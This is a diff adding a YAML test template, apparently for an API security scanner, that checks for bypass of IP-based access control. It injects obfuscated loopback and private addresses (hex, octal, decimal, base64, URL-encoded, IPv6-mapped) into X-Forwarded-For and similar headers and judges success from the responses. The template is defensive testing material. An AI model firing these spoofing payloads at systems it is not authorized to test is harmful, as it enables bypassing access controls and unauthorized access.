@@ -1,0 +1,145 @@
+id: HTTP_HEADER_IP_INJECTION_OBFUSCATED_IP
+info:
+  name: "Obfuscated IP Injection in HTTP headers containing IP address"
+  description: > 
+    "This test involves attackers injecting IP addresses into HTTP headers in a manner that disguises their true intent. This obfuscation can be achieved through various techniques, such as encoding or manipulating header values to bypass detection. The goal is to trick internal systems into processing these hidden or disguised IP addresses, potentially leading to unauthorized access or security breaches."
+  details: >
+    "In this attack, attackers inject obfuscated IP addresses into HTTP headers like `X-Forwarded-For` using techniques such as encoding, concatenation, or other forms of disguise. This manipulation aims to evade detection mechanisms that look for straightforward IP injection patterns. The obfuscated IP addresses can then mislead internal systems into misinterpreting or incorrectly handling the IP information, potentially bypassing security controls or gaining unauthorized access."
+  impact: >
+    "The impact of obfuscated IP injection can be severe, as it may allow attackers to bypass IP-based security filters and gain unauthorized access to internal systems. By disguising their true IP address, attackers can evade detection and exploit vulnerabilities that are reliant on IP address validation. This can lead to security breaches, unauthorized data access, and compromise of internal network integrity."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: HTTP_HEADER_IP_INJECTION_OBFUSCATED_IP
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains_either:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  request_headers:
+    for_one:
+      key:
+        regex: "^X-Forwarded-For$|^X-Real-IP$|^X-Forwarded-Host$|^X-Cluster-Client-IP$|^Forwarded$|^CF-Connecting-IP$|^True-Client-IP$|^X-Original-Forwarded-For$|^X-Client-IP$|^Client-IP$|^X-Azure-Client-IP$|^X-Azure-ClientIP$|^X-Akamai-Client-IP$|^X-Originating-IP$|^X-Remote-IP$|^X-Appengine-User-IP$|^Via$|^X-Host$|^X-ProxyUser-Ip$|^X-Forwarded$|^X-Real-IP-From$|^CF-Connecting-IPv6$|^Remote-Addr$|^X-Client-Public-IP$|^X-Forwarded-For-IP$|^X-Cloudflare-CDN-Loop$|^X-Coming-From$|^X-Originating-URL$|^X-Client-Connection-IP$"
+        extract: userKey
+      value:
+        regex: "\b(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
+        extract: userVal
+wordLists:
+  IPPayloads:
+    - "0x7f000001"
+    - "0177.0000.0000.0001"
+    - "2130706433"
+    - "&#49;.&#49;.&#49;.&#49;"
+    - "MQ==.MQ==.MQ==.MQ=="
+    - "0xC0A80001"
+    - "0x000000C0A80001"
+    - "192%2E168%2E1%2E1"
+    - "::ffff:192.168.1.1"
+    - "::192.168.0.1"
+
+
+execute:
+  type: single
+  requests:
+  - req:
+    - modify_header:
+        userKey: ${IPPayloads}
+        
+validate:
+  or:
+    - response_payload:
+        length:
+          gt: 0
+        percentage_match:
+          gte: 90
+        not_contains_either:
+          - Error
+          - Internal Server 
+          - Failed
+          - Unauthorized
+          - access denied
+          - Forbidden
+          - Method Not allowed
+          - Gateway timeout
+          - request timeout
+          - server error
+          - server busy
+          - authentication error
+          - authorization error
+          - validation error
+          - Permission Denied
+          - invalid token
+          - token expired
+          - session expired
+          - session timeout
+          - unexpected error
+          - unable to process request
+          - bad request
+          - service unavailable
+          - account is locked
+          - account is blocked
+          - multiple failed attempts
+    - response_headers:
+        for_one:
+          key:
+            regex: .*
+          value:
+            contains_either:
+              - "0x7f000001"
+              - "0177.0000.0000.0001"
+              - "2130706433"
+              - "&#49;.&#49;.&#49;.&#49;"
+              - "MQ==.MQ==.MQ==.MQ=="
+              - "0xC0A80001"
+              - "0x000000C0A80001"
+              - "192%2E168%2E1%2E1"
+              - "::ffff:192.168.1.1"
+              - "::192.168.0.1"
